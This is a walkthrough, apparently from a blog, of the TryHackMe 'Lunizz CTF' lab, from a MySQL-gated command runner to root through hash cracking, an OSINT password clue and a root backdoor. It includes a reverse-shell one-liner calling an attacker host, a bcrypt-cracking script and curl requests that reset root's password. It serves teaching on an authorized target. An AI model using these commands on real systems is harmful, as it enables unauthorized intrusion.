@@ -1,0 +1,247 @@
+---
+title: 'Lunizz CTF'
+description: 'A MySQL-gated command executor turns weak DB creds into RCE, then a custom base64+bcrypt scheme, an OSINT photo clue, and a root-owned loopback backdoor chain all the way to root on this Linux boot2root.'
+date: 2025-12-01
+platform: tryhackme
+room: 'Lunizz CTF'
+roomUrl: 'https://tryhackme.com/room/lunizzctfnd'
+difficulty: medium
+tags:
+  - 'linux'
+  - 'mysql'
+  - 'rce'
+  - 'bcrypt'
+  - 'password-cracking'
+  - 'osint'
+  - 'privesc'
+vulnClasses:
+  - 'weak credentials'
+  - 'insecure command execution'
+  - 'custom password hashing'
+  - 'insecure privileged service'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Lunizz CTF — MySQL-Gated RCE, a Custom bcrypt Scheme, and a Root Backdoor**
+
+_A walkthrough of the "Lunizz CTF" Linux boot2root on TryHackMe. A web command-runner is deliberately disabled until a flag in a MySQL table is flipped — weak database creds let us flip it and land RCE. From a www-data shell we crack a deliberately awkward base64-then-bcrypt hash with a custom keygen, pivot through two users (one password hidden behind an OSINT photo clue), and finish by abusing a root-owned_ loopback _backdoor that happily resets root's password._
+
+> Flags, passwords, and hashes are redacted. Lunizz CTF is an authorized training room on TryHackMe; everything here was performed against a legal practice target. Flags are shown as `thm{<redacted>}` and recovered secrets as `<redacted>` — real on the box but withheld here.
+
+---
+
+### **TL;DR — the whole chain**
+
+<Callout type="tldr">
+
+Recon finds a web **command executor on :5000** that refuses to run anything → web enumeration leaks MySQL creds `runcheck:<redacted>` → in the DB, table `runornot.runcheck` holds a single flag `run = 0`; flip it to **1** and the executor springs to life → **RCE → reverse shell as** **`www-data`** → a leaked script in `/proct/pass/` hashes passwords as **base64-then-bcrypt**, so a **custom keygen** cracks it where plain John can't → `su adam` → an OSINT clue (a Google Maps link to a _northern-lights_ spot) is **mason's password** → `su mason`, grab **user.txt** → a root-owned backdoor on **127.0.0.1:8080** accepts `cmdtype=passwd` and **resets root's password** → `su -`, grab **r00t.txt**.
+
+Unauthenticated recon → root, through weak creds, a writable "run" flag, custom crypto, OSINT, and an insecure privileged service.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-tun0-ip>
+```
+
+A rustscan/nmap sweep shows a busy Linux host:
+
+```text
+22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu
+80/tcp    open  http     Apache 2.4.41 (default page)
+3306/tcp  open  mysql    MySQL 8.0.42
+4444/tcp  open  unknown  "Can you decode this for me?" + base64  (rabbit hole)
+5000/tcp  open  unknown  custom web "command" service
+33060/tcp open  mysqlx   MySQL X protocol
+```
+
+Port **4444** teases base64 strings (`ZXh0cmVtZXNlY3VyZXJvb3RwYXNzd29yZA==` → `extremesecurerootpassword`, etc.) — decoys that go nowhere. The real action is the **:5000 command runner** and **MySQL**.
+
+### **The vulnerability — a command runner gated by a writable MySQL flag**
+
+The :5000 service looks like it should run commands you submit, but it never does. Web enumeration explains why — and hands us the key to turn it on.
+
+```text
+gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/big.txt -t 128
+# /hidden   (301)
+# /whatever (301)
+gobuster dir -u http://$IP/ -w .../directory-list-2.3-medium.txt -x txt -t 128
+# /instructions.txt (200)
+```
+
+Those pages reveal that command execution is toggled by a value in the database, and they leak a set of MySQL credentials:
+
+```text
+runcheck:<redacted>
+```
+
+<Callout type="insight">
+
+The design flaw is treating a **client-reachable MySQL row as an authorization switch**. The executor trusts `runornot.runcheck.run` to decide whether to run commands, but the `runcheck` DB user can _write_ that row. Anyone who reaches MySQL with those creds controls the switch — so weak, leaked credentials become remote code execution.
+
+</Callout>
+
+### **Step 1 — flip the "run" flag in MySQL to unlock RCE**
+
+Connect with the leaked creds (TLS is required) and inspect the gating table:
+
+```text
+mysql -u runcheck -h $IP -p --ssl --ssl-verify-server-cert=FALSE
+
+MySQL [(none)]> use runornot;
+MySQL [runornot]> select * from runcheck;
+# +-----+
+# | run |
+# +-----+
+# |   0 |   <- executor disabled
+# +-----+
+MySQL [runornot]> update runcheck set run = 1;
+MySQL [runornot]> select * from runcheck;
+# | run | = 1   <- executor now live
+```
+
+With `run = 1`, the :5000 command runner executes our input — a straight **remote code execution** primitive.
+
+### **Step 2 — RCE to a reverse shell as www-data**
+
+Stand up a listener, then have the executor fire a reverse shell back:
+
+```text
+# attacker
+nc -lvnp 4444
+
+# executed via the :5000 runner
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ATTACKER_IP 4444 >/tmp/f
+```
+
+```text
+connect to [$ATTACKER_IP] from (UNKNOWN) [$IP]
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@lunizz:/var/www/html/whatever$
+```
+
+We land as `www-data`. Looking around the filesystem root, a non-standard directory stands out: `/proct/`.
+
+### **Step 3 — www-data → adam: crack a base64-then-bcrypt hash**
+
+Inside `/proct/pass/` sits a leaked helper, `bcrypt_encryption.py`, that reveals exactly how the next password is hashed — and leaves the hash in a comment:
+
+```text
+import bcrypt, base64
+passw = "wewillROCKYOU".encode('ascii')      # hint: use rockyou
+b64str = base64.b64encode(passw)             # base64 FIRST
+hashAndSalt = bcrypt.hashpw(b64str, bcrypt.gensalt())
+# hashAndSalt = b'$2b$12$<redacted-bcrypt-hash>'
+```
+
+<Callout type="insight">
+
+The twist: each candidate is **base64-encoded before it's bcrypt-hashed**. Feed `rockyou.txt` straight into John/Hashcat and nothing ever matches, because the tool hashes the raw word, not its base64 form. You have to replicate the app's exact pipeline — and the bcrypt salt is simply the first 29 characters of the leaked `$2b$12$...` string.
+
+</Callout>
+
+A tiny keygen reuses the leaked salt and the base64-then-bcrypt order to brute-force against rockyou:
+
+```text
+import bcrypt, base64
+salt = b'$2b$12$<redacted-salt>'
+target = b'$2b$12$<redacted-bcrypt-hash>'
+for word in open('rockyou.txt', encoding='latin-1'):
+    cand = base64.b64encode(word.strip().encode('ascii', 'ignore'))
+    if bcrypt.hashpw(cand, salt) == target:
+        print('cracked:', word.strip()); break
+# -> cracked (value redacted)
+```
+
+With the recovered password we switch user:
+
+```text
+su adam        # password: <redacted>
+```
+
+### **Step 4 — adam → mason: an OSINT photo clue (user flag)**
+
+adam's home holds a few `runasmason*` artifacts and a note tucked in `~/Desktop/.archive/`:
+
+```text
+cat ~/Desktop/.archive/to_my_best_friend_adam.txt
+# do you remember our place
+# i love there it's soo calming
+# i will make that lights my password
+# https://www.google.com/maps/@68.5090469,27.481808,3a,75y,...
+```
+
+The Maps link points to a far-northern location, and "that lights" + "calming" is a clear nod to the **northern lights** — the single word is mason's password:
+
+```text
+su mason       # password: <redacted>  (the "lights" from the clue)
+cat /home/mason/user.txt
+# thm{<redacted>}
+```
+
+### **Step 5 — mason → root: abuse the loopback root backdoor (root flag)**
+
+As mason, local listeners reveal a service bound to loopback on **:8080**, and it's running as **root**:
+
+```text
+ss -tulpn        # 127.0.0.1:8080 LISTEN
+ps aux | grep 127.0.0.1
+# root ... php -S 127.0.0.1:8080 -t /root/
+```
+
+It's "Mason's Root Backdoor", which takes a POST with `password` and `cmdtype` (`lsla`, `reboot`, `passwd`). The password hint — _"\[your place ;)\]"_ — is the same OSINT answer. `lsla` already lists `/root` as root, but `passwd` is the win: it **resets root's password** to whatever we send:
+
+```text
+curl http://127.0.0.1:8080 -X POST -d 'password=<redacted>&cmdtype=lsla'
+# (directory listing of /root, as root)
+
+curl http://127.0.0.1:8080 -X POST -d 'password=<redacted>&cmdtype=passwd'
+# Password Changed To :<redacted>
+```
+
+With root's password now known, we simply elevate:
+
+```text
+su -           # password: <redacted>
+cat /root/r00t.txt
+# thm{<redacted>}
+```
+
+Recon → weak DB creds → flip a flag → RCE → crack custom crypto → OSINT → root backdoor → full root.
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — full remote root compromise.** A representative score for the foothold RCE is **CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`): the command runner is reachable remotely and is gated only by a database row that weak, leaked credentials let anyone flip. From there the box chains entirely attacker-reproducible weaknesses:
+
+- **Weak/leaked credentials + a writable "authorization" flag** turn MySQL access into code execution.
+- **Home-grown password hashing** (base64-then-bcrypt) with the hash and salt left on disk — obscurity, not security.
+- **Secrets derivable by OSINT** (a photo clue reused as a password).
+- **A root-owned loopback backdoor** that resets the root password on request — anyone who reaches loopback as any user becomes root.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Never gate command execution on a client-writable value**, and don't expose a "run commands" endpoint at all. If server-side execution is required, use a fixed allow-list and a real, server-side authorization check — not a MySQL row the app's own DB user can flip.
+2. **Use strong, unique database credentials** and least-privilege DB users; the web role should not be able to rewrite control data. Keep MySQL off untrusted networks.
+3. **Don't roll your own password scheme.** bcrypt is fine, but base64-wrapping and leaving the hash/salt in a world-readable script defeats the point. Store hashes out of the web root with correct permissions.
+4. **Remove the loopback "backdoor" entirely.** A root process that resets the root password on an unauthenticated-ish request is a straight privilege-escalation gift; no legitimate service needs it.
+
+</Callout>
+
+### **Takeaways**
+
+- **Authorization must live server-side.** A "feature flag" an attacker can write is not a control — here a single `UPDATE` statement bought RCE.
+- **Match the target's exact hashing pipeline.** Plain John fails against base64-then-bcrypt; replicating the app's order (and reusing the leaked salt) cracks it in one short script.
+- **OSINT is part of the attack surface.** A sentimental note plus a Maps link handed over a user password — real people reuse exactly these.
+- **Enumerate local, root-owned services.** The last hop wasn't a kernel exploit or a SUID binary — it was a root web app on loopback doing something it never should.
+
+Thanks for reading. Lunizz CTF is a tour of "small" misconfigurations — a writable flag, leaked creds, DIY crypto, an OSINT password, a helpful backdoor — that stack neatly from an anonymous scan all the way to root.
